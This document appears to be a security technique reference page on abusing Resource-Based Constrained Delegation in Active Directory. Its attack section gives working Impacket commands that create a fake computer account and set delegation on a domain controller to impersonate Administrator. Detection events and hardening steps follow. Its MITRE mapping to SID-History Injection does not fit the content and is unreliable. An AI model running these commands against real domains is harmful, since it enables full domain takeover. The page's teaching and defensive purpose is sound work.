# [PE-TOKEN-002]: Resource-Based Constrained Delegation (RBCD)

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | PE-TOKEN-002 |
| **MITRE ATT&CK v18.1** | [Access Token Manipulation: SID-History Injection (T1134.005)](https://attack.mitre.org/techniques/T1134/005/) |
| **Tactic** | Privilege Escalation / Lateral Movement |
| **Platforms** | Windows AD |
| **Severity** | **Critical** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Traditionally, Constrained Delegation is configured on the *delegating* account (e.g., IIS Service). In RBCD, the configuration is on the *target* resource (e.g., File Server). Specifically, the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on the target computer object controls who can impersonate users to it. Crucially, any user with `GenericWrite` or `WriteProperty` over a computer object can modify this attribute. An attacker with these rights can configure a compromised service account (or a fake computer account they create) to impersonate *any* user (including Domain Admin) to that target.
- **Attack Surface:** AD Object Permissions (ACLs).
- **Business Impact:** **Domain Compromise**. Taking over Domain Controllers or critical servers.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Write access to target Computer Object.
- **Tools:**
    - [Impacket](https://github.com/fortra/impacket) (`rbcd.py`)
    - [StandIn](https://github.com/FuzzySecurity/StandIn)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Create Fake Computer**
Attacker needs a customized Service Principal Name (SPN) to perform delegation.
```bash
addcomputer.py -computer-name 'FakeComp$' -computer-pass 'Welcome123!' domain.local/user:pass
```

**Step 2: Configure RBCD**
Target: `DC01`. Delegate: `FakeComp$`.
```bash
rbcd.py -delegate-from 'FakeComp$' -delegate-to 'DC01$' -action 'write' domain.local/user:pass
```

**Step 3: Get Service Ticket (S4U)**
Impersonate Administrator to CIFS/DC01.
```bash
getST.py -spn 'cifs/DC01.domain.local' -impersonate 'Administrator' -dc-ip 192.168.1.1 'domain.local/FakeComp$:Welcome123!'
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 AD Logs
| Source | Event | Filter Logic |
|---|---|---|
| **Security** | 4741 / 4742 | Computer Account Changed. Filter for changes to `msDS-AllowedToActOnBehalfOfOtherIdentity`. |
| **Security** | 5136 | Directory Service Change. Attribute = `msDS-AllowedToActOnBehalfOfOtherIdentity`. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **ACL Hardening:** Ensure `Domain Users` or other low-privilege groups do not have `GenericWrite` permissions on sensitive Computer objects.
*   **Protected Users:** Members of the `Protected Users` group cannot be impersonated via Delegation. Add Admins to this group.

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-RECON-002] (BloodHound ACL Analysis)
> **Next Logical Step:** [CA-UNSC-001] (DCSync)
